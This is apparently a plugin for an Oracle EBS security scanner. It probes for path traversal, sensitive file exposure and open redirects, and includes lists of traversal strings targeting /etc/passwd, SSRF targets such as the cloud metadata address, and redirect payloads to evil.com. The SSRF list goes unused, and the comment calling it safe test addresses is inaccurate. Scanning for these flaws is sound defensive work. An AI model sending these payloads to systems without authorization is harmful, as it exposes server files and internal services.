"""
Plugin: SSRF, Path Traversal & File Disclosure
Tests for server-side request forgery, directory traversal, and file disclosure.
Intrusivity: medium
"""

from scanner.base_plugin import BasePlugin

# Path traversal payloads (targeting common EBS config files)
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "../../../oracle/inst/apps/%s_appsTier/appl/admin/%s_run.env",
    "../../../u01/oracle/apps/tech_st/10.1.3/Apache/Apache/conf/httpd.conf",
]

TRAVERSAL_ENDPOINTS = [
    "/OA_HTML/OA.jsp",
    "/reports/rwservlet",
    "/OA_HTML/cabo/images/",
]

TRAVERSAL_INDICATORS = [
    "root:x:", "root:0:0", "nobody:x:", "/bin/bash", "/bin/sh",
    "[boot loader]", "WINDOWS", "win.ini",
    "ORA_", "ORACLE_HOME", "APPL_TOP", "TWO_TASK",
]

# SSRF test targets (safe, RFC5737 TEST-NET addresses)
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",        # AWS metadata
    "http://192.0.2.1/",                                # TEST-NET-1 (RFC5737)
    "http://127.0.0.1:1521/",                           # Local Oracle DB
    "http://localhost:7001/console",                    # WebLogic admin
    "http://127.0.0.1:4848/",                           # GlassFish
    "dict://127.0.0.1:11211/stat",                     # Memcached
]

SSRF_ENDPOINTS = [
    {
        "path": "/OA_HTML/RF.jsp",
        "param": "OAFunc",
        "label": "RF.jsp OAFunc",
    },
    {
        "path": "/reports/rwservlet",
        "param": "report",
        "label": "Reports Server report param",
    },
    {
        "path": "/OA_HTML/OA.jsp",
        "param": "redirect",
        "label": "OAF redirect param",
    },
]

# Sensitive files that may be accessible
SENSITIVE_FILE_PATHS = [
    ("/OA_HTML/appsutil/", "appsutil directory", "high"),
    ("/OA_HTML/OA_MEDIA/", "OA_MEDIA static files", "info"),
    ("/.env", ".env file exposure", "critical"),
    ("/WEB-INF/web.xml", "WEB-INF web.xml", "critical"),
    ("/WEB-INF/classes/", "WEB-INF classes", "critical"),
    ("/META-INF/", "META-INF directory", "high"),
    ("/OA_HTML/cabo/jsLibs/debug/", "Debug JS libraries", "medium"),
    ("/admin/", "Admin directory", "high"),
    ("/server-status", "Apache server-status", "medium"),
    ("/server-info", "Apache server-info", "medium"),
    ("/.git/", "Git repository exposed", "critical"),
    ("/.svn/", "SVN repository exposed", "high"),
    ("/OA_HTML/appsutil/cloneconfig/", "Clone config files", "high"),
]


class SSRFTraversalPlugin(BasePlugin):
    PLUGIN_ID = "ssrf_traversal"
    PLUGIN_NAME = "SSRF, Path Traversal & File Disclosure"
    PLUGIN_DESC = "Tests EBS for server-side request forgery, directory traversal, and sensitive file exposure."
    CATEGORY = "Injection"
    MIN_INTRUSIVITY = "medium"
    BASE_SEVERITY = "high"
    CVE_REFS = ["CVE-2017-10268"]

    def run(self):
        self._check_path_traversal()
        self._check_sensitive_files()
        self._check_open_redirect()
        return self.findings

    def _check_path_traversal(self):
        for endpoint in TRAVERSAL_ENDPOINTS:
            for payload in TRAVERSAL_PAYLOADS[:4]:  # Limit to avoid noise
                for param in ["page", "file", "path", "document", "include"]:
                    resp, err = self.probe(endpoint, params={param: payload})
                    if err or not resp:
                        continue
                    body = resp.text
                    matched = [i for i in TRAVERSAL_INDICATORS if i in body]
                    if matched:
                        self.find(
                            title=f"Path Traversal Vulnerability: {endpoint}",
                            severity="critical",
                            description=(
                                f"Parameter '{param}' on {endpoint} is vulnerable to path traversal. "
                                f"Attacker can read arbitrary files from the server filesystem."
                            ),
                            url=self.target + endpoint,
                            evidence=f"Payload: {payload[:60]} | Matched: {', '.join(matched[:2])}",
                            remediation=(
                                "Validate and sanitize all file path parameters. "
                                "Use whitelist-based path validation. "
                                "Apply Oracle EBS security patches."
                            ),
                            cvss=9.1,
                        )
                        return  # Found one, stop

    def _check_sensitive_files(self):
        for path, label, severity in SENSITIVE_FILE_PATHS:
            resp, err = self.probe(path)
            if err or not resp:
                continue
            if resp.status_code == 200:
                # Extra confirmation for critical ones
                body = resp.text[:500]
                self.find(
                    title=f"Sensitive Resource Exposed: {label}",
                    severity=severity,
                    description=f"The resource '{path}' is publicly accessible and may disclose sensitive configuration or source code.",
                    url=self.target + path,
                    evidence=f"HTTP {resp.status_code} | Content preview: {body[:100].strip()}",
                    remediation=f"Restrict access to '{path}' via Apache/OHS location directives.",
                )
            elif resp.status_code == 403:
                if severity == "critical":
                    self.find(
                        title=f"Sensitive Resource Returns 403: {label}",
                        severity="low",
                        description=f"'{path}' returns HTTP 403, confirming its existence but blocking access. Verify access controls are robust.",
                        url=self.target + path,
                        evidence=f"HTTP 403",
                        remediation="Ensure resource is completely inaccessible or properly authenticated.",
                    )

    def _check_open_redirect(self):
        redirect_payloads = [
            "//evil.com",
            "https://evil.com",
            "//evil.com/phish",
            "javascript:alert(1)",
        ]
        for payload in redirect_payloads:
            for param in ["redirect", "ReturnURL", "nextPage", "goto", "url", "return"]:
                resp, err = self.probe("/OA_HTML/RF.jsp", params={param: payload})
                if err or not resp:
                    continue
                if resp.status_code in (301, 302):
                    loc = resp.headers.get("Location", "")
                    if "evil.com" in loc or payload in loc:
                        self.find(
                            title="Open Redirect via RF.jsp",
                            severity="medium",
                            description=(
                                f"The RF.jsp endpoint redirects to user-supplied URLs without validation. "
                                f"This can be used in phishing attacks to redirect EBS users to malicious sites."
                            ),
                            url=self.target + "/OA_HTML/RF.jsp",
                            evidence=f"Param '{param}={payload}' → Location: {loc}",
                            remediation=(
                                "Validate redirect URLs against an allowlist of internal domains. "
                                "Apply Oracle EBS patches for RF.jsp redirect handling."
                            ),
                            cvss=6.1,
                        )
                        return
